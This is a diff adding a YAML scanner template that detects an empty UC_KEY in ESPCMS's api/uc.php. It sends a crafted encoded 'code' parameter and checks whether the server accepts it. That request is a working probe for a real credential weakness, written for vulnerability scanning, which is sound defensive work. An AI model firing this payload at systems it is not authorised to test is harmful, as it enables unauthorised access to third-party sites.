@@ -1,0 +1,22 @@
+id: poc-yaml-espcms-ucapiphp-uckey-empty
+info:
+  name: ESPCMS api/uc.php中的UC_KEY为空
+  severity: high
+  tags:
+  - 硬编码凭据
+  finger: ESPCMS
+  osprey-id: vb_2018_0005
+requests:
+- method: GET
+  path: /api/uc.php
+  expression: 'contains(body, "Invalid Request")
+
+    '
+- method: GET
+  path: /api/uc.php?code=60c8lxsJcpFnTJEDHYGFTrcF/Pip/9o8P2M7JiCEJ7iaWHq8GUKY9PPlg0191xUASpiX4eI3VMs
+  expression: '!contains(body, "Invalid Request") && contains(body, "1") && !contains(body,
+    "</html>")
+
+    '
+variables: {}
+transport: http
